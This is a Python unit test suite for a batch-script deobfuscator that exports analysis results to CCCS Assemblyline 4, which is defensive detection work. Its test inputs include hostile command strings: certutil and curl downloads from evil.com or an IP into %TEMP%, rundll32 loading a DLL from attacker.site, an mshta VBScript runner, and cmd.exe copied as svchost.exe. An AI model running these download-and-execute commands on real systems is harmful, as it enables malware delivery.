"""
Comprehensive Unit & Integration Test Suite for CCCS Assemblyline 4 Interoperability Bridge.
Validates ontology compliance, heuristic detection (1-10), trait extraction, LOLBAS identification,
download target scoring, extracted artifact generation, memory zeroization, and CLI export.

Engineered by Maya Thorne.
"""

import io
import json
import os
import sys
import tempfile
import unittest
from pathlib import Path
from typing import Dict, Any

from deobfuscator.assemblyline_models import (
    AssemblylineResult,
    AssemblylineSection,
    AssemblylineHeuristic,
    AssemblylineExtractedFile,
    CCCS_HEURISTICS,
    KNOWN_LOLBAS_BINARIES,
    CUSTOM_BATCH_ID,
    CUSTOM_PS1_ID,
    truncate_command,
    zeroize_bytes,
    zeroize_dict,
)
from deobfuscator.assemblyline import (
    AssemblylineBridge,
    extract_batch_traits,
    generate_assemblyline_report,
    export_assemblyline_result,
)
from deobfuscator.core import BatchDeobfuscator
from deobfuscator.cli import main as cli_main


class TestAssemblylineBridge(unittest.TestCase):
    """Test suite covering CCCS Assemblyline 4 interoperability, ontology, and scoring."""

    def test_assemblyline_heuristic_creation_and_scoring(self):
        """Verify heuristic instantiation, default scores, and signature scoring."""
        heur = AssemblylineHeuristic(1)
        self.assertEqual(heur.heur_id, 1)
        self.assertEqual(heur.score, 50)
        self.assertEqual(heur.name, "Additional command grouping after command normalization")
        self.assertIn("T1059.003", heur.attack_ids)

        heur.add_signature_id("custom_sig", 75)
        self.assertEqual(heur.calculate_effective_score(), 125)
        d = heur.to_dict()
        self.assertEqual(d["score"], 125)
        self.assertEqual(d["signatures"]["custom_sig"], 75)

    def test_assemblyline_section_and_subsection_hierarchy(self):
        """Verify section tree building, tagging, row addition, and serialization."""
        sec = AssemblylineSection("Command Execution", body_format="TABLE")
        sec.add_tag("dynamic.process.command_line", "cmd.exe /c whoami")
        sec.add_row({"Command": "cmd.exe /c whoami", "User": "SYSTEM"})

        sub = AssemblylineSection("Download Details", heuristic=AssemblylineHeuristic(5))
        sub.add_tag("network.static.uri", "http://example.com/malware.exe")
        sec.add_subsection(sub)

        d = sec.to_dict()
        self.assertEqual(d["title_text"], "Command Execution")
        self.assertEqual(len(d["body"]), 1)
        self.assertIn("dynamic.process.command_line", d["tags"])
        self.assertEqual(len(d["subsections"]), 1)
        self.assertEqual(d["subsections"][0]["depth"], 1)

    def test_assemblyline_result_aggregation_and_total_score(self):
        """Verify result score calculation and global heuristic/tag aggregation."""
        res = AssemblylineResult(classification="TLP:AMBER")
        h1 = AssemblylineHeuristic(1)  # 50
        h2 = AssemblylineHeuristic(3)  # 250
        h2.add_signature_id("extra_bonus", 50)  # +50 = 300

        s1 = AssemblylineSection("Sec1", heuristic=h1)
        s1.add_tag("tag1", "val1")

        s2 = AssemblylineSection("Sec2", heuristic=h2)
        s2.add_tag("tag2", "val2")

        res.add_section(s1)
        res.add_section(s2)

        self.assertEqual(res.calculate_total_score(), 350)
        res_dict = res.to_dict()
        self.assertEqual(res_dict["extra"]["score"], 350)
        self.assertIn("tag1", res_dict["results"]["tags"])
        self.assertIn("tag2", res_dict["results"]["tags"])
        self.assertEqual(len(res_dict["results"]["heuristics"]), 2)

    def test_truncate_command(self):
        """Verify command truncation and key renaming per CCCS specification."""
        short_cmd = "echo hello"
        k, v = truncate_command("Command", short_cmd)
        self.assertEqual(k, "Command")
        self.assertEqual(v, "echo hello")

        long_cmd = "a" * 150
        k, v = truncate_command("Command", long_cmd, max_len=100)
        self.assertEqual(k, "Command [trunc]")
        self.assertEqual(len(v), 100)

    def test_trait_extraction_command_grouping(self):
        """Verify extraction of hidden command groupings revealed during normalization."""
        orig = "@echo off\nset x=whoami^&calc.exe\n%x%"
        deobf = "@echo off\nset x=whoami&calc.exe\nwhoami&calc.exe"
        traits = extract_batch_traits(orig, deobf, {})
        self.assertIn("command-grouping", traits)
        self.assertEqual(len(traits["command-grouping"]), 1)

    def test_trait_extraction_lolbas_detection(self):
        """Verify detection of LOLBAS binaries across normalized commands."""
        orig = "powershell -enc AAAA\ncertutil -urlcache -f http://evil.com/x.exe %temp%\\x.exe"
        traits = extract_batch_traits(orig, orig, {})
        self.assertIn("LOLBAS", traits)
        lbs = {item["LOLBAS"] for item in traits["LOLBAS"]}
        self.assertIn("powershell", lbs)
        self.assertIn("certutil", lbs)

    def test_trait_extraction_start_with_var(self):
        """Verify detection of execution starting with variable content."""
        orig = "%CMD_VAR% /c calc.exe"
        deobf = "cmd.exe /c calc.exe"
        traits = extract_batch_traits(orig, deobf, {})
        self.assertIn("start_with_var", traits)
        self.assertEqual(traits["start_with_var"][0][0], orig)

    def test_trait_extraction_high_var_density(self):
        """Verify identification of lines with more than 10 variable expansions."""
        orig = "%a%%b%%c%%d%%e%%f%%g%%h%%i%%j%%k%%l% test"
        deobf = "powershell whoami"
        traits = extract_batch_traits(orig, deobf, {})
        self.assertIn("var_used", traits)
        self.assertGreater(traits["var_used"][0][2], 10)

    def test_trait_extraction_download_and_destination_scoring(self):
        """Verify external file download parsing and temp/programdata signature scoring."""
        orig = "curl -o %TEMP%\\trojan.exe http://198.51.100.25/bin.exe"
        bridge = AssemblylineBridge()
        res = bridge.generate_service_result(orig, orig, {})
        res_dict = res.to_dict()

        download_sec = next((s for s in res_dict["extra"]["sections"] if "download" in s["title_text"].lower()), None)
        self.assertIsNotNone(download_sec)
        self.assertIn("network.static.uri", download_sec["tags"])
        self.assertIn("network.static.ip", download_sec["tags"])
        self.assertIn("198.51.100.25", download_sec["tags"]["network.static.ip"])

        # Check subsection with downloads_file_to_temp signature
        sub = download_sec["subsections"][0]
        self.assertIn("downloads_file_to_temp", sub["heuristic"]["signatures"])
        self.assertEqual(sub["heuristic"]["signatures"]["downloads_file_to_temp"], 250)

    def test_trait_extraction_complex_one_liner(self):
        """Verify complex one-liner detection and bonus signature scoring."""
        orig = "for %i in (1 2 3 4 5) do echo %i"
        deobf = "echo 1\necho 2\necho 3\necho 4\necho 5\necho 6"
        bridge = AssemblylineBridge(complex_one_liner_threshold=4)
        res = bridge.generate_service_result(orig, deobf, {})
        res_dict = res.to_dict()

        one_liner_sec = next((s for s in res_dict["extra"]["sections"] if s["title_text"] == "Complexe One-Liner"), None)
        self.assertIsNotNone(one_liner_sec)
        self.assertEqual(one_liner_sec["body"]["Number of line after deobfuscation"], 6)

    def test_trait_extraction_windows_util_manipulation(self):
        """Verify Windows utility copying and execution tracking."""
        orig = "copy C:\\Windows\\System32\\cmd.exe %APPDATA%\\svchost.exe\n%APPDATA%\\svchost.exe /c whoami"
        bridge = AssemblylineBridge()
        res = bridge.generate_service_result(orig, orig, {})
        res_dict = res.to_dict()

        util_sec = next((s for s in res_dict["extra"]["sections"] if "Utility Manipulation" in s["title_text"]), None)
        self.assertIsNotNone(util_sec)
        self.assertEqual(len(util_sec["body"]), 1)

        exec_sec = next((s for s in res_dict["extra"]["sections"] if "Execution of manipulated" in s["title_text"]), None)
        self.assertIsNotNone(exec_sec)

    def test_trait_extraction_setp_file_redirection(self):
        """Verify set /p file creation detection."""
        orig = "set /p var= < payload.b64 > output.bat"
        bridge = AssemblylineBridge()
        res = bridge.generate_service_result(orig, orig, {})
        res_dict = res.to_dict()

        setp_sec = next((s for s in res_dict["extra"]["sections"] if "set /p" in s["title_text"]), None)
        self.assertIsNotNone(setp_sec)
        self.assertIn("output.bat", setp_sec["body"][0]["Filename"])

    def test_trait_extraction_rundll32_with_url(self):
        """Verify rundll32 detection with internet_download signature and URI tagging."""
        orig = "rundll32.exe http://attacker.site/drop.dll,EntryPoint"
        bridge = AssemblylineBridge()
        res = bridge.generate_service_result(orig, orig, {})
        res_dict = res.to_dict()

        r_sec = next((s for s in res_dict["extra"]["sections"] if "Rundll32" in s["title_text"]), None)
        self.assertIsNotNone(r_sec)
        self.assertIn("internet_download", r_sec["heuristic"]["signatures"])
        self.assertEqual(r_sec["heuristic"]["signatures"]["internet_download"], 500)
        self.assertIn("network.static.uri", r_sec["tags"])

    def test_trait_extraction_mshta_and_net_use(self):
        """Verify mshta and net use table creation with password/server tags."""
        orig = (
            "mshta vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"calc.exe\"\"\"))\n"
            "net use \\\\10.0.0.1\\c$ /user:DOMAIN\\admin P@ssw0rd123!"
        )
        bridge = AssemblylineBridge()
        res = bridge.generate_service_result(orig, orig, {})
        res_dict = res.to_dict()

        mshta_sec = next((s for s in res_dict["extra"]["sections"] if "Mshta" in s["title_text"]), None)
        self.assertIsNotNone(mshta_sec)

        net_sec = next((s for s in res_dict["extra"]["sections"] if "Net Use" in s["title_text"]), None)
        self.assertIsNotNone(net_sec)
        self.assertIn("info.password", net_sec["tags"])
        self.assertIn("P@ssw0rd123!", net_sec["tags"]["info.password"])

    def test_extracted_files_generation(self):
        """Verify generation of root deobfuscated batch file and secondary stagers."""
        orig = "@echo off\nset a=calc\n%a%"
        deobf = "@echo off\ncalc"
        meta = {
            "cradlecrafter_telemetry": {
                "decoded_payloads_count": 1,
                "decoded_payloads": ["Write-Output 'Pwned'"],
            },
            "batchtoapp_pe": {
                "extracted_script": "@echo off\necho embedded",
            },
        }
        bridge = AssemblylineBridge()
        res = bridge.generate_service_result(orig, deobf, meta)
        self.assertGreaterEqual(len(res.extracted_files), 3)

        names = [f.name for f in res.extracted_files]
        self.assertTrue(any("deobfuscated.bat" in n for n in names))
        self.assertTrue(any("ps1_stager" in n for n in names))
        self.assertTrue(any("embedded_batchtoapp" in n for n in names))

    def test_specialized_engine_section_attachment(self):
        """Verify multi-engine telemetry creates specialized detections section with ATT&CK tags."""
        meta = {
            "batcloak_telemetry": {"detected": True, "confidence": 0.95},
            "batchstealer_telemetry": {"is_batchstealer": True, "confidence": 0.90},
            "wirebits_telemetry": {"is_wirebits": True, "confidence": 0.85},
        }
        bridge = AssemblylineBridge()
        res = bridge.generate_service_result("echo test", "echo test", meta)
        res_dict = res.to_dict()

        spec_sec = next((s for s in res_dict["extra"]["sections"] if "Specialized Batch Obfuscator" in s["title_text"]), None)
        self.assertIsNotNone(spec_sec)
        self.assertEqual(len(spec_sec["body"]), 3)
        self.assertIn("technique.obfuscation", spec_sec["tags"])
        self.assertIn("BatCloak", spec_sec["tags"]["technique.obfuscation"])
        self.assertIn("BatchStealer", spec_sec["tags"]["technique.obfuscation"])

    def test_zeroize_memory_security(self):
        """Verify in-memory buffers and dictionaries are zeroized."""
        buf = bytearray(b"super_secret_payload")
        zeroize_bytes(buf)
        self.assertEqual(buf, bytearray(len(buf)))

        d = {"key": "secret", "nested": {"token": "12345"}}
        zeroize_dict(d)
        self.assertEqual(len(d), 0)

    def test_save_and_export_helper(self):
        """Verify saving Assemblyline JSON report and extracted artifacts to directory."""
        with tempfile.TemporaryDirectory() as td:
            out_file = export_assemblyline_result(
                output_path=os.path.join(td, "custom_report.json"),
                script_text="set a=echo\n%a% hi",
                deobfuscated_text="echo hi",
                meta={},
            )
            self.assertTrue(os.path.exists(out_file))
            loaded = json.loads(Path(out_file).read_text(encoding="utf-8"))
            self.assertIn("extra", loaded)
            self.assertIn("results", loaded)
            self.assertIn("files", loaded)

    def test_cli_format_assemblyline(self):
        """Verify CLI --format assemblyline outputs valid CCCS Assemblyline JSON to stdout."""
        with tempfile.TemporaryDirectory() as td:
            bat_path = os.path.join(td, "test.bat")
            Path(bat_path).write_text("powershell -enc AAAA", encoding="utf-8")

            old_stdout = sys.stdout
            sys.stdout = io.StringIO()
            try:
                ret = cli_main([bat_path, "--format", "assemblyline"])
                out_str = sys.stdout.getvalue()
            finally:
                sys.stdout = old_stdout

            self.assertEqual(ret, 0)
            data = json.loads(out_str)
            self.assertIn("extra", data)
            self.assertIn("sections", data["extra"])

    def test_cli_assemblyline_out_flag(self):
        """Verify CLI --assemblyline-out exports report to disk."""
        with tempfile.TemporaryDirectory() as td:
            bat_path = os.path.join(td, "test.bat")
            al_out = os.path.join(td, "assemblyline_report.json")
            Path(bat_path).write_text("certutil -urlcache http://evil.com/a.exe", encoding="utf-8")

            old_stdout = sys.stdout
            sys.stdout = io.StringIO()
            try:
                ret = cli_main([bat_path, "--assemblyline-out", al_out])
            finally:
                sys.stdout = old_stdout

            self.assertEqual(ret, 0)
            self.assertTrue(os.path.exists(al_out))
            data = json.loads(Path(al_out).read_text(encoding="utf-8"))
            self.assertIn("extra", data)
            self.assertIn("files", data)


if __name__ == "__main__":
    unittest.main()
